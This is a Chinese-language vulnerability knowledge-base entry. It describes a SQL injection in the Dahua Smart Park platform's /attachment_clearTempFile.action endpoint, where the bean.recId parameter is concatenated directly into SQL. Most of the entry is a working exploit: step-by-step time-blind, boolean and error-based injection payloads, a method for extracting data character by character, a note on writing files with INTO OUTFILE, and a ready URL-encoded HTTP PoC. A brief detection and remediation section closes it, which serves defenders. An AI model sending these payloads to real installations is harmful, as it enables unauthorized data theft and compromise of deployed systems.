---
id: web-java-component-dahua-attachment-cleartempfile-recid-sqli
title: 大华智慧园区 attachment_clearTempFile.action：bean.recId 字符串拼接 SQL 注入
type: scenario
domain: web
path: web/java/component
technique: dahua-attachment-cleartempfile-recid-sqli
aliases:
- 大华智慧园区 SQL 注入
- attachment_clearTempFile
- bean.recId 注入
- AttachmentDaoImpl getAttachmentListBySearchBean
- REC_ID in 拼接注入
- Struts2 attachment action
tags:
- java
- dahua
- wpms
- struts2
- sqli
- jdbc
- recid
- attachment
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V211
  verified_at: '2026-11-07T04:48:53+08:00'
  notes: 已对照原文与 img40-43 核对：/attachment_clearTempFile.action、bean.recId/bean.tabName 绑定、AttachmentAction.clearTempFile → clearTmpFileJson → getAttachmentListBySearchBean 的 and t.REC_ID in ( 拼接与原文一致。未验证点：changeRecId 实现原文未展示，注入可利用性依赖其是否改写输入；原文未附实际响应。
---

## 一句话结论

大华智慧园区 `/attachment_clearTempFile.action` 把请求参数 `bean.recId` 绑定到 `AttachmentBean`，经 `AttachmentManagerImpl.clearTmpFileJson` 传入 `AttachmentDaoImpl.getAttachmentListBySearchBean`，后者用 `" and t.REC_ID in (" + bean.getRecId() + ")"` 直接拼接 SQL，可注入任意条件做时间盲注/报错注入，读取数据库数据。

## 原理

- Struts2 的 `attachment_*` action 映射把 `/attachment_clearTempFile.action` 交给 `AttachmentAction.clearTempFile`；`bean.recId`、`bean.tabName` 通过参数绑定写入 `AttachmentBean`。
- `AttachmentAction.clearTempFile` 调用 `attachmentManagerImpl.clearTmpFileJson(bean.getRecId(), bean.getTabName())`；`clearTmpFileJson` 构造 `AttachmentBean` 并调用 `attachmentDaoImpl.getAttachmentListBySearchBean(searchBean)`。
- `getAttachmentListBySearchBean` 用 `StringBuffer` 拼 SQL：`select * from C_ATTACHMENT t where 1=1`，`tabName` 用 `?` 参数化，但 `RecId` 使用 `sqlBuffer.append(" and t.REC_ID in (" + bean.getRecId() + ") ")` 直接拼接。`RecId` 来自请求，因此注入点无需闭合引号，直接在 `in (...)` 内构造子查询/布尔/时间条件。
- 为什么成立：JDBC 只对 `?` 占位符做数据绑定，字符串拼接部分进入 SQL 语法层；`in (...)` 内可放任意表达式（如 `1) AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -`）。
- 边界：原文只给出注入点和 PoC 形式，未附实际延迟/数据提取截图；可利用性取决于数据库类型、`C_ATTACHMENT` 表是否存在、账号权限。

## 触发条件

- 目标为大华智慧园区平台，`/attachment_clearTempFile.action` 可访问（Struts2 `attachment-*` package）。
- `bean.recId` 能绑定到 `AttachmentBean.recId`，且请求进入 `clearTempFile` 分支。
- 数据库为 MySQL/其他支持子查询/时间函数的类型，账号可执行对应函数。
- `C_ATTACHMENT` 表存在（默认业务表）。

## 利用步骤

1. 访问 `/attachment_clearTempFile.action?bean.recId=1&bean.tabName=user_table`，确认接口正常返回。
2. 构造时间盲注：`bean.recId=1) AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -`，URL 编码后发送，观察响应是否延迟约 5 秒。
3. 若无延迟，尝试布尔/报错注入：`bean.recId=1) AND 1=1-- -` 与 `1=2` 对比，或用 `updatexml`/`extractvalue`。
4. 用 `IF(ASCII(SUBSTR((SELECT ...),1,1))>N,SLEEP(5),0)` 逐位提取库名、表名、数据。
5. `bean.tabName` 虽是 `?` 参数化，但可改变查询的业务表名；结合 `recId` 注入可扩大影响。

## PoC

```http
GET /attachment_clearTempFile.action?bean.recId=1%29%20AND%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29x%29--%20-&bean.tabName=user_table HTTP/1.1
Host: target
```

```sql
-- getAttachmentListBySearchBean 中的危险拼接（示意）
select * from C_ATTACHMENT t where 1=1 and t.tab_name=? and t.REC_ID in (1) AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -)
```

## 变体与关联

- 变体：同平台的 `MaterialController`/`PlayerController` 还有 MyBatis `ORDER BY ${sortBy} ${sortOrder}` 注入（见 [[web-java-component-dahua-wpms-mybatis-orderby-sqli]]）。
- 变体：`bean.tabName` 若在其它 DAO 中未参数化，可改表名/联合查询；`recId` 也可用 `INTO OUTFILE` 写文件（需 FILE 权限）。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]、[[web-generic-sqli-java-identifier-table-order-by-injection]]、[[web-generic-sqli-second-order-injection]]。
- 边界：`C_ATTACHMENT` 表或字段不存在时注入语句会报错，需先确认表结构；Struts2 参数名 `bean.recId` 的绑定依赖 OGNL/参数拦截器配置。

## 检测与防御

- **检测特征**：`bean.recId` 出现括号、`SELECT`、`SLEEP`、注释符；接口响应时间异常；数据库报错回显；Struts2 参数中含 `bean.` 前缀的注入尝试。
- **修复**：`RecId` 改为 `?` 占位符或整数校验（只允许数字/逗号分隔的数字列表）；表名使用白名单映射；禁止字符串拼接 SQL。
- **加固**：数据库最小权限、关闭 `INTO OUTFILE`；WAF 拦截 `SLEEP`/`UPDATEXML` 等；升级/加固 Struts2 参数绑定。
